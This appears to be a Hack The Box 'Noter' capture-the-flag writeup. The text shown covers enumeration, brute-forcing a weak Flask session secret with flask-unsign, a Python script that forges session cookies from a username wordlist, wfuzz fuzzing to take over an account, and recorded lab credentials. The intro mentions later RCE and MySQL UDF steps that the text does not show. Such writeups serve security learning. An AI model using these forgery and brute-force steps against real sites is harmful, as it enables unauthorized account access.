## HTB Noter (Medium) - Writeup

Difficulty: Medium

In this box, I started by enumerating an FTP service and a Flask-based web app where I discovered a weakly signed session cookie.  
Using flask-unsign, I brute-forced the secret key and generated admin session tokens, revealing credentials through a privileged note.  
With those, I accessed the FTP server and downloaded application backups, one of which exposed an RCE vulnerability in a Node.js script (md-to-pdf).  
Finally, I leveraged a MySQL UDF exploit using a discovered root password to escalate to root and gain full control of the system.  
---

## Nmap 

#### The nmap scan revealed three open and ports:  

![obraz](https://github.com/user-attachments/assets/79d8e1d8-1044-487c-ad85-98cbea2b866c)

## Port 21 - FTP

I always start with ftp when doing ctf challenges.  

![obraz](https://github.com/user-attachments/assets/163c9a88-f1a1-466c-a34b-0c13e7b5ea4f)

I tried logging in with username "anonymous" and a blank password "", but it failed.  



## Port 5000 - Website  

Website looks like this and welcomes us with login page:  

![obraz](https://github.com/user-attachments/assets/086102ac-3ec6-4ba1-8e5c-ad7a75b357ef)

First I tried some default credentials like admin:admin, but they failed.  
Then I tried sqli authentication bypass, also failed.  

Let's just register an account:  

![obraz](https://github.com/user-attachments/assets/f346d0f3-aaea-46d8-8c91-3fa1c68e1d83)

We found that this website is running CKEditor for notes:  

![obraz](https://github.com/user-attachments/assets/130aaae1-d657-429d-a7ba-ca8dad7fe8e9)

Then I did directory busting:  
```
feroxbuster --url http://10.10.11.160:5000/ -x php -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```
Nothing intresting.  

When we click on note we get /note/3, another idea was to look for IDOR vulnerability.  
I tried /note/1 and a few other ones but they also didn't work.  

Next thing that I checked was response headers with curl:  

![obraz](https://github.com/user-attachments/assets/5c6c3fa8-df43-4696-a292-918c14e1b3df)

That is an intresting finding.  
At first glance it looks like JWT token, unfortunately we wasn't able to decode it.  

Turns out that it is a Flask cookie.  
There is a tool called flask-unsign that can be used to decode flask cookies.  
```
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiZWVlZSJ9.aF_apQ.zdGYMEDn5AaY6SsoJSeW4KFz2lc'
```

![obraz](https://github.com/user-attachments/assets/5b755eb3-7512-4d49-845d-f788b87b5617)

Flask cookies contain a secret that can be brute-forced if it's weak enough:  
```
flask-unsign --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiZWVlZSJ9.aF_apQ.zdGYMEDn5AaY6SsoJSeW4KFz2lc' -w /usr/share/wordlists/rockyou.txt --no-literal-eval
```
![obraz](https://github.com/user-attachments/assets/6a4dc8e5-c3dd-4578-8520-6c5ea1cc4d7d)


## Crafting a cookie  

With the secret we can craft any cookie we want, let's hope there is an admin account:  
```
flask-unsign --sign --cookie "{'logged_in': True, 'username': 'admin'}" --secret 'secret123'
```
Now I'll replace the cookie with newly created one in devtools.  
Unfortunately it didn't work.  

There is other option that we can try.  
If we create a list of many cookies everyone with different username.  
We then should be able to brute-force website and get different response when we submit existing cookie.  

I created simple script that will generate a list of cookies for us:  
```python
import subprocess

wordlist_path = '/usr/share/wordlists/seclists/Usernames/Names/names.txt'
secret_key = 'secret123'

with open(wordlist_path, 'r') as file:
    for user in file:
        user = user.strip()
        cookie_data = f"{{'logged_in': True, 'username': '{user}'}}"
        cmd = [
            'flask-unsign',
            '--sign',
            '--cookie', cookie_data,
            '--secret', secret_key
        ]
        subprocess.run(cmd)
```

Now we can run it with:  
```
python3 generate.py > list2.txt
```
It can take up to 5-10 mins.  
Now we want to fuzz an existing cookie:  
```
wfuzz -w list2.txt -u http://10.10.11.160:5000/dashboard -H "Cookie: session=FUZZ" --hc 302
```

![obraz](https://github.com/user-attachments/assets/042091fc-54f9-4650-b55e-436de8dc7461)


It worked, in the syntax we filtered out 302 code and waited for 200.  
Let's open devtools and replace cookie with the one that wfuzz found.  
After we refresh the page we get admin access as user "blue":  

![obraz](https://github.com/user-attachments/assets/49290dd6-5302-41b5-9943-819c4c3b50b3)

I looked through the dashboard and found note with credentials:  

![obraz](https://github.com/user-attachments/assets/fb7ac166-d7a5-4904-ab93-3c20a915a71e)

Let's write them down:  
+  blue:blue@Noter!


## Back to FTP

Those credentials fail for ssh but work for ftp.  

![obraz](https://github.com/user-attachments/assets/7ebc363b-5311-467f-952a-5eff1120cc61)

We transfered policy.pdf to kali, let's take a look at it.  


























































































